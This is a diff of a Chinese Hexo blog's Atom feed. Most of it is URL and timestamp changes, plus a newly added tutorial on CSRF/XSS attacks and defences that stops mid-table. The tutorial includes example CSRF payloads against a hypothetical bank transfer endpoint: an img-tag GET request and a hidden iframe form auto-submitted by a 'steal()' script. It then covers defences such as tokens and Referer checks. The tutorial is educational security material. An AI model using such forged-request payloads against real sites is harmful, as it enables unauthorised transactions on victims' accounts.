     <content type="html">&lt;h3 id=&quot;NodeJS、NPM安装&quot;&gt;&lt;a href=&quot;#NodeJS、NPM安装&quot; class=&quot;headerlink&quot; title=&quot;NodeJS、NPM安装&quot;&gt;&lt;/a&gt;NodeJS、NPM安装&lt;/h3&gt;&lt;p&gt;由于Hexo是基于NodeJS的静态博客框架，首先我们必须要在机器上安装NodeJS运行环境。&lt;br&gt;到NodeJS&lt;a href=&quot;https://nodejs.org/en/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官网&lt;/a&gt;下载好对应系统版本的安装文件，这里以Windows系统为例。&lt;br&gt;Windows下的NodeJS安装比较简单，下载好安装文件以后，双击运行一路next就好，中间注意选择安装到自己喜欢的路径下面。&lt;/p&gt;
 &lt;p&gt;NPM为NodeJS的插件管理器，就类似于我们系统里的应用商店，默认已经随NodeJS一起安装了。&lt;/p&gt;
@@ -377,10 +793,10 @@
   
   <entry>
     <title>API接口文档设计</title>
-    <link href="http://yoursite.com/learning/api-design.html"/>
-    <id>http://yoursite.com/learning/api-design.html</id>
+    <link href="http://yoursite.com/learning/learning/api-design.html"/>
+    <id>http://yoursite.com/learning/learning/api-design.html</id>
     <published>2016-03-03T16:00:00.000Z</published>
-    <updated>2016-04-11T06:59:18.962Z</updated>
+    <updated>2016-04-16T11:29:51.944Z</updated>
     
     <content type="html">&lt;h3 id=&quot;功能说明&quot;&gt;&lt;a href=&quot;#功能说明&quot; class=&quot;headerlink&quot; title=&quot;功能说明&quot;&gt;&lt;/a&gt;功能说明&lt;/h3&gt;&lt;p&gt;简单说明接口实现的相关功能，使用场景等等。&lt;/p&gt;
 &lt;h3 id=&quot;调用说明&quot;&gt;&lt;a href=&quot;#调用说明&quot; class=&quot;headerlink&quot; title=&quot;调用说明&quot;&gt;&lt;/a&gt;调用说明&lt;/h3&gt;&lt;h4 id=&quot;请求地址&quot;&gt;&lt;a href=&quot;#请求地址&quot; class=&quot;headerlink&quot; title=&quot;请求地址&quot;&gt;&lt;/a&gt;请求地址&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://www.xxx.com/api/demo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -455,10 +871,10 @@
   
   <entry>
     <title>初识NSQ分布式实时消息架构</title>
-    <link href="http://yoursite.com/learning/nsq-start.html"/>
-    <id>http://yoursite.com/learning/nsq-start.html</id>
+    <link href="http://yoursite.com/learning/learning/nsq-start.html"/>
+    <id>http://yoursite.com/learning/learning/nsq-start.html</id>
     <published>2015-08-25T16:00:00.000Z</published>
-    <updated>2016-04-11T06:58:11.274Z</updated>
+    <updated>2016-04-16T11:29:51.940Z</updated>
     
     <content type="html">&lt;h3 id=&quot;1-NSQ知识普及&quot;&gt;&lt;a href=&quot;#1-NSQ知识普及&quot; class=&quot;headerlink&quot; title=&quot;1.NSQ知识普及&quot;&gt;&lt;/a&gt;1.NSQ知识普及&lt;/h3&gt;&lt;p&gt;NSQ是一个基于Go语言的开源的分布式实时消息平台，他的代码托管在GitHub上。&lt;/p&gt;
 &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://github.com/nsqio/nsq&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -531,10 +947,10 @@
   
   <entry>
     <title>Windows下端口占用程序查询</title>
-    <link href="http://yoursite.com/learning/windows-port-used.html"/>
-    <id>http://yoursite.com/learning/windows-port-used.html</id>
+    <link href="http://yoursite.com/learning/learning/windows-port-used.html"/>
+    <id>http://yoursite.com/learning/learning/windows-port-used.html</id>
     <published>2015-05-15T16:00:00.000Z</published>
-    <updated>2016-04-11T06:58:45.826Z</updated>
+    <updated>2016-04-16T11:29:51.937Z</updated>
     
     <content type="html">&lt;h3 id=&quot;1-打开命令行工具&quot;&gt;&lt;a href=&quot;#1-打开命令行工具&quot; class=&quot;headerlink&quot; title=&quot;1.打开命令行工具&quot;&gt;&lt;/a&gt;1.打开命令行工具&lt;/h3&gt;&lt;p&gt;输入以下命令：&lt;/p&gt;
 &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -aon|findstr 8082&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -553,6 +969,192 @@
     </summary>
     
       <category term="学习" scheme="http://yoursite.com/categories/learning/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>CSRF和XSS防御与攻击</title>
+    <link href="http://yoursite.com/learning/learning/csrf%E5%92%8Cxss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.html"/>
+    <id>http://yoursite.com/learning/learning/csrf和xss攻击与防御.html</id>
+    <published>2015-04-05T16:00:00.000Z</published>
+    <updated>2016-04-19T10:12:56.916Z</updated>
+    
+    <content type="html">&lt;h3 id=&quot;CSRF概述&quot;&gt;&lt;a href=&quot;#CSRF概述&quot; class=&quot;headerlink&quot; title=&quot;CSRF概述&quot;&gt;&lt;/a&gt;CSRF概述&lt;/h3&gt;&lt;p&gt;CSRF(Cross-Site Request Forgery)，翻译过来叫做跨站请求伪造。是一种挟制终端用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。&lt;br&gt;攻击者只要借助少许的社会工程诡计，例如通过电子邮件或者是聊天软件发送的链接，攻击者就能迫使&lt;br&gt;一个Web应用程序的用户去执行攻击者精心构造的操作。&lt;/p&gt;
+&lt;h4 id=&quot;实例解释&quot;&gt;&lt;a href=&quot;#实例解释&quot; class=&quot;headerlink&quot; title=&quot;实例解释&quot;&gt;&lt;/a&gt;实例解释&lt;/h4&gt;&lt;p&gt;假设某用户登录网络银行去查看其存款余额，他没有退出网络银行系统就去了自己喜欢的论坛去逛逛，如果攻击者在论坛事先已经构造了一个恶意转账的链接并诱使该用户点击了该链接，那么该用户在网络银行帐户中的资金就有可能被转移到攻击者指定的帐户中。&lt;/p&gt;
+&lt;h4 id=&quot;危害&quot;&gt;&lt;a href=&quot;#危害&quot; class=&quot;headerlink&quot; title=&quot;危害&quot;&gt;&lt;/a&gt;危害&lt;/h4&gt;&lt;p&gt;当CSRF针对普通用户发动攻击时，将对终端用户的数据和操作指令构成严重的威胁，危及个人隐私及财产；当受攻击的终端用户具有管理员帐户的时候，CSRF攻击可能会危及整个Web应用程序。&lt;/p&gt;
+&lt;h3 id=&quot;CSRF成因&quot;&gt;&lt;a href=&quot;#CSRF成因&quot; class=&quot;headerlink&quot; title=&quot;CSRF成因&quot;&gt;&lt;/a&gt;CSRF成因&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Web浏览器对于Cookie和HTTP身份验证信息之类的会话信息的处理方式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;浏览器会自动地发送标识用户对话的信息，而无需用户干预。换句话说，&lt;br&gt;当浏览器发送这些身份信息的时候，用户根本感觉不到。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者对Web应用程序URL的了解&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;分析请求URL或者通过访问该应用程序并查看嵌入HTML/JavaScript中的URL&lt;br&gt;以及表单来了解应用程序有关的URL、参数和容许值。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;WEB应用会话管理对浏览器的透明性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;浏览器可以访问会话管理信息，如果Web应用程序完全依赖于这类信息来识别&lt;br&gt;一个用户会话，这就为跨站请求伪造创造了条件。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;各种能够引发资源请求HTML标签&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;link&amp;gt;,&amp;lt;img&amp;gt;,&amp;lt;iframe&amp;gt;,&amp;lt;script&amp;gt;等等可以跨域引用第三方资源的标签，这些带有&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;src属性的标签每次加载是就相当于触发一次GET请求。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&quot;CSRF触发条件&quot;&gt;&lt;a href=&quot;#CSRF触发条件&quot; class=&quot;headerlink&quot; title=&quot;CSRF触发条件&quot;&gt;&lt;/a&gt;CSRF触发条件&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;1.登陆信任网站，本地存有用户cookie&lt;/li&gt;
+&lt;li&gt;2.没有登出信任网站，访问危险网站。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;被攻击用户浏览器在用户不知明的情况下被迫向被攻击站点发起伪造的请求。&lt;br&gt;请求过程会带上被攻击用户的身份认证标识(cookie)。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040600.jpg&quot; alt=&quot;csrf&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;CSRF攻击&quot;&gt;&lt;a href=&quot;#CSRF攻击&quot; class=&quot;headerlink&quot; title=&quot;CSRF攻击&quot;&gt;&lt;/a&gt;CSRF攻击&lt;/h3&gt;&lt;p&gt;案例一：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;银行网站A，它以GET请求来完成银行转账的操作:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http://www.mybank.com/Transfer.php?toBankId=11&amp;amp;money=1000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;危险网站B，它里面有一段HTML的代码如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;amp;money=1000&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;案例二：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;银行网站A的WEB表单如下（后台接收按request.getParameter()接收参数）:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;form action=&amp;quot;Transfer.php&amp;quot; method=&amp;quot;GET&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p&amp;gt;ToBankId: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;toBankId&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p&amp;gt;Money: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;money&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Transfer&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;危险网站B，它里面有同样一段HTML的代码如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;amp;money=1000&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;案例三:&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;银行网站A的WEB表单如下（后台接收限制POST方式接收接收参数）:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;form action=&amp;quot;Transfer.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p&amp;gt;ToBankId: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;toBankId&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p&amp;gt;Money: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;money&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Transfer&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;危险网站B也跟着改进了一下代码:	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;iframe name=&amp;quot;ifr_trans&amp;quot; display=&amp;quot;none&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; name=&amp;quot;transfer&amp;quot;　action=&amp;quot;http://www.myBank.com/Transfer.php&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;toBankId&amp;quot; value=&amp;quot;11&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;money&amp;quot; value=&amp;quot;1000&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function steal()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     iframe = document.frames[&amp;quot;ifr_trans&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     iframe.document.Submit(&amp;quot;transfer&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;用户防御意识&quot;&gt;&lt;a href=&quot;#用户防御意识&quot; class=&quot;headerlink&quot; title=&quot;用户防御意识&quot;&gt;&lt;/a&gt;用户防御意识&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;使用完Web应用程序之后记得退出登录&lt;/li&gt;
+&lt;li&gt;不要让浏览器保存敏感网站用户名/密码&lt;/li&gt;
+&lt;li&gt;不要随便点击陌生人发的未知链接&lt;/li&gt;
+&lt;li&gt;不要使用同一浏览器同时访问敏感的应用程序和随意冲浪&lt;/li&gt;
+&lt;li&gt;小心查看支持HTM格式的邮件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;CSRF防御&quot;&gt;&lt;a href=&quot;#CSRF防御&quot; class=&quot;headerlink&quot; title=&quot;CSRF防御&quot;&gt;&lt;/a&gt;CSRF防御&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;1.过滤所有用户发布的链接（下下策）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;攻击者不一定要从站内发起请求，而且就算从站内发起请求，&lt;br&gt;途径也远远不知链接一条。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;嵌入危险网站的图片引用触发攻击请求：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=&amp;quot;http://www.xxx.com/feedback?content=xxx&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;2.请求头Referer检测(防小白HACKER)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站。&lt;/p&gt;
+&lt;p&gt;验证 Referer ，就是把安全性都依赖于第三方（即浏览器）来保障，&lt;br&gt;从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或&lt;br&gt;FF2，有一些方法可以随意篡改 Referer 值。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;3.请求令牌token（高级一点）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;i.服务器端生成随机字符串，作为令牌（token），保存在Session里。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ii.请求的页面用隐藏域形式存储token。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iii.token与其他信息一起提交。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iv.服务断比较接收到的令牌与Session中的令牌，相同才处理请求。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   否则返回失败状态。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v.正常处理完请求一定一定一定要清理token。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;4.高级请求令牌（破解难度大，影响用户体验）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;图片验证码等,短信验证码,语音验证码等等&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;5.非主流处理方式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;i.尽量使用POST而不是GET&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(POST可以通过JavaScript进行模仿,相对提高了攻击难度)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ii.跳转中间确认页&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;告诉你一个不好的消息&quot;&gt;&lt;a href=&quot;#告诉你一个不好的消息&quot; class=&quot;headerlink&quot; title=&quot;告诉你一个不好的消息&quot;&gt;&lt;/a&gt;告诉你一个不好的消息&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;事实上目前无法从根本解决CSRF防御问题，只能尽量构造更多障碍，提高攻击难度，构造更多障碍的同时会影响正常用户的用户体验。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&quot;浏览器同源策略&quot;&gt;&lt;a href=&quot;#浏览器同源策略&quot; class=&quot;headerlink&quot; title=&quot;浏览器同源策略&quot;&gt;&lt;/a&gt;浏览器同源策略&lt;/h3&gt;&lt;p&gt;同源策略，它是由Netscape提出的一个著名的安全策略。现在所有支持JavaScript的浏览器都会使用这个策略。所谓同源是指，域名，协议，端口相同。&lt;/p&gt;
+&lt;p&gt;现有链接&lt;strong&gt;&lt;a href=&quot;http://www.xxx.com/1.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.xxx.com/1.js&lt;/a&gt;&lt;/strong&gt;，下表列出相关链接是否同源情况&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;站点/链接&lt;/th&gt;
+&lt;th&gt;是否同源&lt;/th&gt;
+&lt;th&gt;判断依据&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&quot;https://www.xxx.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.xxx.com&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;不同源&lt;/td&gt;
+&lt;td&gt;协议不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&quot;http://m.xxx.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://m.xxx.com&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;不同源&lt;/td&gt;
+&lt;td&gt;子域名不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&quot;http://xxx.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://xxx.com&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;不同源&lt;/td&gt;
+&lt;td&gt;域名不同，此为顶级域&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href=&quot;http://www.xxx.com:9999&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.xxx.com:9999&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;不同源&lt;/td&gt;
+&lt;td&gt;端口不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
